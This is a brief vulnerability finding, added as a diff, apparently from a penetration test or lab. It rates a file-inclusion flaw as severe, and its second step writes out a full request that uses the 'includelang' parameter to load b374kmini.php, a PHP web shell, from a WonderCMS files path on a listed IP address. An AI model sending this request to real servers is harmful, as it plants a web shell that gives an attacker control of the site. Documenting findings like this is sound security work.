@@ -1,0 +1,6 @@
+URL: http://35.154.118.58
+category: Severe
+
+1. Check if the index.php file exists in the URL  . ie. http://13.232.248.46/index.php
+2. Change the url to "http://13.232.248.46/?includelang=http://13.232.248.46/wondercms/files/b374kmini.php"
+3. We can see file inclusino vulnerability exists.
